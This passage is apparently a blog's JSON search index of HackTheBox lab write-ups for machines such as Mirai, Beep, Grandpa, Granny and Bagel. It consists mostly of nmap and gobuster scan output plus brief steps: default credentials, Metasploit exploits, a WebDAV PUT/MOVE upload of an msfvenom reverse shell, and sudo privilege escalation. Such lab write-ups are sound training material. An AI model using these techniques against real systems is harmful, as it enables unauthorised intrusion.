VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-06T19:33:22 |_ start_date: 2023-06-06T19:27:47 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.","tags":["HTB"],"title":"[HTB] Machine: Blue"},{"categories":null,"contents":"Jupiter Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:10 BST Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.19 seconds ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/jupiter/images/jupiter.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/jupiter/","summary":"Jupiter Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.11.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 15:10 BST Nmap scan report for 10.10.11.216 (10.10.11.216) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.","tags":["HTB"],"title":"[HTB] Machine: Jupiter"},{"categories":null,"contents":"Mirai Enumeration nmap all ports └─$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.94 seconds nmap └─$ nmap -Pn -p22,53,80,1331,32400,32469 -sC -sV 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:46 BST Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | ssh-hostkey: | 1024 aaef5ce08e86978247ff4ae5401890c5 (DSA) | 2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA) | 256 b6a07838d0c810948b44b2eaa017422b (ECDSA) |_ 256 4d6840f720c4e552807a4438b8a2a752 (ED25519) 53/tcp open domain dnsmasq 2.76 | dns-nsid: |_ bind.version: dnsmasq-2.76 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). 1331/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) 32400/tcp open http Plex Media Server httpd |_http-favicon: Plex |_http-title: Unauthorized |_http-cors: HEAD GET POST PUT DELETE OPTIONS | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. 32469/tcp open upnp Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds Check web server Nothing to see Launch gobuster Check admin and versions endpoints Check port 32400 Foothold/User We saw in admin endpoint, that it\u0026rsquo;s a Pi-hole It\u0026rsquo;s a DNS sinkhole that is designed to run on Raspberry Pi So let\u0026rsquo;s try default credentials to get an access We\u0026rsquo;re in Root Check sudo rights sudo user Retrieve the flag Oops, we have a note instead It says to check a usb stick Let\u0026rsquo;s check mounted devices We see /dev/sdb mounted at /media/usbstick, where have another note which indicates that the flag was accidentally deleted You can also use mount to see mounted devices I googled to find a way to retrieve a flag Since in linux everything is a file, maybe we can read the contents of the /dev/sdb The files in any OS usually don\u0026rsquo;t get deleted from device, since it\u0026rsquo;s costly to zero every block on the disk When the file gets deleted, the metadata of the blocks (headers etc) that held the data will be changed from used to free The data will be present, until it is overwritten So let\u0026rsquo;s grep the flag ","date":"June 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/mirai/images/mirai.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/mirai/","summary":"Mirai Enumeration nmap all ports └─$ nmap -Pn -p- 10.10.10.48 -T5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 21:32 BST Warning: 10.10.10.48 giving up on port because retransmission cap hit (2). Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 85.56% done; ETC: 21:46 (0:02:02 remaining) Nmap scan report for 10.10.10.48 (10.10.10.48) Host is up (0.17s latency). Not shown: 64338 closed tcp ports (conn-refused), 1191 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 1331/tcp open intersan 32400/tcp open plex 32469/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 800.","tags":["HTB"],"title":"[HTB] Machine: Mirai"},{"categories":null,"contents":"Beep Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.2.3 |_http-title: Did not follow redirect to https://10.10.10.7/ |_http-server-header: Apache/2.2.3 (CentOS) 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: TOP LOGIN-DELAY(0) EXPIRE(NEVER) RESP-CODES STLS PIPELINING APOP IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE UIDL 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: ID STARTTLS BINARY MULTIAPPEND Completed IDLE OK QUOTA URLAUTHA0001 X-NETSCAPE THREAD=REFERENCES NO LITERAL+ CHILDREN LISTEXT CONDSTORE ATOMIC CATENATE MAILBOX-REFERRALS RENAME SORT=MODSEQ THREAD=ORDEREDSUBJECT IMAP4rev1 LIST-SUBSCRIBED UNSELECT ACL SORT ANNOTATEMORE UIDPLUS NAMESPACE RIGHTS=kxte IMAP4 443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) | http-robots.txt: 1 disallowed entry |_/ | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2023-06-03T13:48:55+00:00; -28s from scanner time. |_http-title: Elastix - Login page 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d 2002/tcp filtered globe 3306/tcp open mysql MySQL (unauthorized) 4445/tcp open upnotifyp? 7070/tcp filtered realserver 7625/tcp filtered unknown 9091/tcp filtered xmltec-xmlmail 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com Host script results: |_clock-skew: -28s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 410.61 seconds Webserver There were too many open ports to check, so I started gobuster in the background Foothold/User Right away I got results, and found admin endpoint Where we can wee the version of the application Found a exploit in exploit-db Same results can be achieved using searchsploit Well, I tried using searchsploit's exploit But no success Since the box is old, I thought maybe there were some version inconsistencies related to libraries, which then happened to be SSL Then I found updated version of exploit Let\u0026rsquo;s run it and get a shell Root The first thing I always check is sudo privileges We see bunch of sudo rights Use GTFOBins and get a root I choose nmap as a privesc path Check 0xdf for other paths ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/beep/images/beep.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/beep/","summary":"Beep Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Beep"},{"categories":null,"contents":"Grandpa Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown | Server Date: Sun, 04 Jun 2023 17:44:06 GMT |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH | http-ntlm-info: | Target_Name: GRANPA | NetBIOS_Domain_Name: GRANPA | NetBIOS_Computer_Name: GRANPA | DNS_Domain_Name: granpa | DNS_Computer_Name: granpa |_ Product_Version: 5.2.3790 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.10.14/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.14/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16239 / 16245 (99.96%) =============================================================== 2023/06/05 15:56:54 Finished =============================================================== Foothold We see a webserver No results on gobuster Based on nmap, we have Microsoft-IIS/6.0 I ran davtest, yet got no success So started googling for public exploits Launched metasploit And got shell As an alternative you can use the following script suggested by 0xdf Root systeminfo c:\\windows\\system32\\inetsrv\u0026gt;systeminfo systeminfo Host Name: GRANPA OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 0 Hours, 50 Minutes, 27 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 762 MB Page File: Max Size: 2,470 MB Page File: Available: 2,300 MB Page File: In Use: 170 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A Let\u0026rsquo;s run exploit suggester We have bunch of options to choose from Let\u0026rsquo;s start with the first one According to Microsoft: MS10-015 could allow elevation of privileges Set options and launch exploit And we rooted the box As an alternative path, we can exploit SeImpersonatePrivileges using Churrasco ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/grandpa/images/grandpa.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/grandpa/","summary":"Grandpa Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB"],"title":"[HTB] Machine: Grandpa"},{"categories":null,"contents":"Granny Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_http-title: Under Construction Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.10.15/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.15/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 17:09:30 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16223 / 16245 (99.86%) =============================================================== 2023/06/05 17:12:38 Finished =============================================================== Looks similar to Grandpa Yet we have success with davtest Foothold Let\u0026rsquo;s try creating file manually Launch Burp Suite And as we can see, we can create files Since it\u0026rsquo;s Microsoft-IIS/6.0 server, we need asp/aspx extension for our shell payload We can use either webshell or reverse shell I created payload using msfvenom Create a shell.txt file on the server And check if it was successful Prepare multi/handler Let\u0026rsquo;s check other HTTP methods MOVE looks interesting Let\u0026rsquo;s google it So we can see how we can use it in our case MOVE shell.txt to shell.aspx Start multi/handler We have a shell Root Since this box was similar to Grandpa the privesc path are also identical You can abuse SeImpersonatePrivileges Or run exploit suggester and run suggested exploits ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/granny/images/granny.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/granny/","summary":"Granny Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB"],"title":"[HTB] Machine: Granny"},{"categories":null,"contents":"Bagel Enumeration nmap └─$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:35 GMT | Connection: close | Help, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:46 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; | RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Content-Length: 54 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (version).)\u0026lt;/h1\u0026gt; | TLSSessionReq: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:47 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true |_ \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; 8000/tcp open http-alt Werkzeug/2.2.2 Python/3.10.9 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:20 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:14 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 263 | Location: http://bagel.htb:8000/?page=index.html | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://bagel.htb:8000/?page=index.html\u0026#34;\u0026gt;http://bagel.htb:8000/?page=index.html\u0026lt;/a\u0026gt;. If not, click the link. | Socks5: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request syntax (\u0026#39; | \u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: Werkzeug/2.2.2 Python/3.10.9 |_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port5000-TCP:V=7.93%I=7%D=5/25%Time=646FA5D2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nServer:\\x20Microsoft SF:-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,E8,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-N SF:etCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\r\\ SF:nContent-Length:\\x2054\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r SF:\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(version\\) SF:\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(HTTPOptions,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nSer SF:ver:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2 SF:018:15:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,E6,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20M SF:icrosoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46 SF:\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive: SF:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\ SF:(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(SSLSessionReq,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Requ SF:est\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\ SF:r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Len SF:gth:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Ba SF:d\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r( SF:TerminalServerCookie,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent- SF:Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu SF:,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nC SF:onnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x2 SF:0\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(TLSSessionReq,E SF:6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\n SF:Server:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023 SF:\\x2018:15:47\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\ SF:nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\ SF:x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8000-TCP:V=7.93%I=7%D=5/25%Time=646FA5CE%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,1EA,\u0026#34;HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\ SF:x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:14\\x2 SF:0GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length: SF:\\x20263\\r\\nLocation:\\x20http://bagel\\.htb:8000/\\?page=index\\.html\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title SF:\u0026gt;Redirecting\\.\\.\\.\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Redirecting\\.\\.\\.\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;You\\x20shoul SF:d\\x20be\\x20redirected\\x20automatically\\x20to\\x20the\\x20target\\x20URL:\\x 